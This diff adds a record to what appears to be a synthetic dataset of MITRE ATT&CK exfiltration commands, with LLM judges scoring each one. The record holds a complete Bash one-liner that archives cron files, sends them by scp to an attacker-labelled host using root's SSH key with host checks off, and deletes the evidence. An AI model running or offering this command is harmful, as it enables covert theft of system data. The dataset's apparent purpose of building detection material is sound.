@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "ts=$(date +%s); tar -czf /tmp/cron_${ts}.tgz /etc/crontab /etc/cron* /var/spool/cron >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/cron_${ts}.tgz attacker@198.51.100.10:/var/tmp/.cache/sched/ >/dev/null 2>&1 && rm -f /tmp/cron_${ts}.tgz",
+  "explanation": "Packages system and user cron configurations to profile task scheduling and exfiltrates them via scp quietly, cleaning up artifacts afterward.",
+  "rationale_steps": [
+    "Collect cron-related files from standard system and user locations.",
+    "Compress into a single archive to limit transfer operations.",
+    "Use scp with identity file and disabled host checks for automated exfiltration.",
+    "Suppress output and delete the temporary archive to reduce visibility."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-e93662d8-d8537a80",
+  "source_prompt_hash": "e93662d8",
+  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Bash one-liner is well-formed with correct variable substitution, command chaining, valid options for tar/scp, proper globbing, and clean redirections.",
+        "semantic_score": 3,
+        "semantic_justification": "It compresses cron data and quietly exfiltrates via SCP with cleanup (consistent with automated exfiltration), but as an unprivileged user it likely cannot read /var/spool/cron or access /root/.ssh/id_rsa, making successful execution implausible as stated.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T04:48:57.213916Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags, appropriate command separators (&&), and correct redirection operators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by collecting cron configuration files, compressing them with a timestamp, securely transferring them to a remote server via SCP with stealth options, and removing the local evidence afterward.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T04:49:00.265484Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for variables, commands, flags, arguments, and command separators.",
+        "semantic_score": 2,
+        "semantic_justification": "The command cannot achieve its claimed intent of packaging all system and user cron configurations and exfiltrating them with the specified SSH key when executed with 'None' privilege, as several target paths and the SSH key require root access, making the command operationally implausible under the given constraints.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:09:59.677397Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
